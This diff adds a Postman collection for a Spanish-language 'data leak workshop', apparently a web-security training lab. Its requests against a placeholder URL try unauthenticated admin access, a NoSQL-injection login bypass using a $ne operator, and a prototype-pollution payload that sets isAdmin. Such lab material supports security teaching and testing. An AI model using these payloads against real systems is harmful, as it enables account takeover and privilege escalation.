@@ -1,0 +1,137 @@
+{
+	"info": {
+		"_postman_id": "",
+		"name": "Taller fuga de datos",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+		"_exporter_id": "",
+		"_collection_link": ""
+	},
+	"item": [
+		{
+			"name": "Página principal",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "{{my_url}}",
+					"host": [
+						"{{my_url}}"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Acceso admin",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "{{my_url}}api/admin",
+					"host": [
+						"{{my_url}}api"
+					],
+					"path": [
+						"admin"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Inyección NoSQL",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/json",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\"username\": \"admin\", \"password\": {\"$ne\": null}}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "{{my_url}}api/login",
+					"host": [
+						"{{my_url}}api"
+					],
+					"path": [
+						"login"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Escalar privilegios",
+			"request": {
+				"method": "PUT",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/json",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\"__proto__\": {\"isAdmin\": true}}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "{{my_url}}api/user/settings",
+					"host": [
+						"{{my_url}}api"
+					],
+					"path": [
+						"user",
+						"settings"
+					]
+				}
+			},
+			"response": []
+		}
+	],
+	"event": [
+		{
+			"listen": "prerequest",
+			"script": {
+				"type": "text/javascript",
+				"packages": {},
+				"requests": {},
+				"exec": [
+					""
+				]
+			}
+		},
+		{
+			"listen": "test",
+			"script": {
+				"type": "text/javascript",
+				"packages": {},
+				"requests": {},
+				"exec": [
+					""
+				]
+			}
+		}
+	],
+	"variable": [
+		{
+			"key": "my_url",
+			"value": ""
+		}
+	]
+}
